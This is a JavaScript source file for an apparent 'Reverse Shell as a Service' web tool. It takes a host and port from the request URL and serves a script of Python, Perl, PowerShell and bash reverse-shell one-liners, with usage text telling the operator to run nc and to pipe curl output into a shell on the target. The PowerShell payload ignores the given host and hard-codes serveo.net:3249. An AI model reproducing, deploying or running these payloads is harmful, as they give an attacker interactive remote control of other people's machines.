'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# List Of Payload:
#
# 1. python
#
# 2. perl
#
# 3. pwrshell
#
# 4. sh
#
# How to use:
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl -s https://shell.now.sh/yourip:1337 | payloadname
#
# 3. Don't be a dick`;

const generateScript = (host, port) => {
	const payloads = {
		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
		perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
		pwrshell: `powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('serveo.net',3249);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
		bash: `/bin/bash -i >& /dev/tcp/${host}/${port} 0>&1`,

        };

	return Object.entries(payloads).reduce((script, [cmd, payload]) => {
		script += `

if command -v ${cmd} > /dev/null 2>&1; then
	${payload}
	exit;
fi`;

		return script;
	}, '');
};

const reverseShell = req => {
	const [host, port] = req.url.substr(1).split(':');
	return usage + (host && port && generateScript(host, port));
};

module.exports = reverseShell;
